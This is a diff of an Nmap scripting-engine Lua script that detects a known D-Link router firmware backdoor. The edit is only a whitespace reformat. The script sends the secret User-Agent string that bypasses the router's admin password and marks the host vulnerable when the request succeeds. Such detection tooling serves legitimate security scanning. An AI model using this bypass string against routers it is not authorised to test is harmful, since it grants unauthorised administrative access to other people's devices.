@@ -44,28 +44,28 @@ local vulns = require "vulns"
 portrule = shortport.http
 
 action = function(host, port)
-	local response = http.get(host, port, "/", { redirect_ok = false, no_cache = true })
-	local server = response.header and response.header['server'] or ""
-	local vuln_table = {
-		title = "Firmware backdoor in some models of D-Link routers allow for admin password bypass",
-		state = vulns.STATE.NOT_VULN,
-		risk_factor = "High",
-		description = [[
+  local response = http.get(host, port, "/", { redirect_ok = false, no_cache = true })
+  local server = response.header and response.header['server'] or ""
+  local vuln_table = {
+    title = "Firmware backdoor in some models of D-Link routers allow for admin password bypass",
+    state = vulns.STATE.NOT_VULN,
+    risk_factor = "High",
+    description = [[
 D-Link routers have been found with a firmware backdoor allowing for admin password bypass using a "secret" User-Agent string.
 ]],
-		references = {
-		'http://www.devttys0.com/2013/10/reverse-engineering-a-d-link-backdoor/',
-		}
-	}
-	if ( response.status == 401 and server:match("^thttpd%-alphanetworks") ) or
-	 	( response.status == 302 and server:match("^Alpha_webserv") ) then
-		response = http.get(host, port, "/", { header = { ["User-Agent"] = "xmlset_roodkcableoj28840ybtide" } })
+    references = {
+      'http://www.devttys0.com/2013/10/reverse-engineering-a-d-link-backdoor/',
+    }
+  }
+  if ( response.status == 401 and server:match("^thttpd%-alphanetworks") ) or
+    ( response.status == 302 and server:match("^Alpha_webserv") ) then
+    response = http.get(host, port, "/", { header = { ["User-Agent"] = "xmlset_roodkcableoj28840ybtide" } })
 
-		if ( response.status == 200 ) then
-			vuln_table.state = vulns.STATE.VULN
-			local report = vulns.Report:new(SCRIPT_NAME, host, port)
-			return report:make_output(vuln_table)
-		end
-	end
-	return
+    if ( response.status == 200 ) then
+      vuln_table.state = vulns.STATE.VULN
+      local report = vulns.Report:new(SCRIPT_NAME, host, port)
+      return report:make_output(vuln_table)
+    end
+  end
+  return
 end
